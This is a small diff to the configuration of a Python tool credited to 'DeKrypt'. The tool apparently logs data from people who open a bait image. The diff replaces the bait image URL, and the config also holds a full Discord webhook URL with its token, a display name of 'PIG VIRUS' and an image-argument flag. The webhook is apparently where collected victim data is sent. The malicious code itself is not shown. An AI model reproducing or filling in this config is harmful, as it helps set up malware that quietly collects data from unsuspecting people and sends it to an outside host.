@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1359382890751725588/c-jxRmgOQPZN4_QvA8J5jhDnubu80Gixs6eDEuDA18X2638IpxRgWb-pS6vX9vlE_iMB",
-    "image": "https://kovar.vn/wp-content/uploads/2020/08/bmw-i8.jpg",
+    "image": "https://i.imgur.com/AdUp7AC.jpeg",
     "imageArgument": True,
     "username": "PIG VIRUS",
     "color": 0x00FFFF,
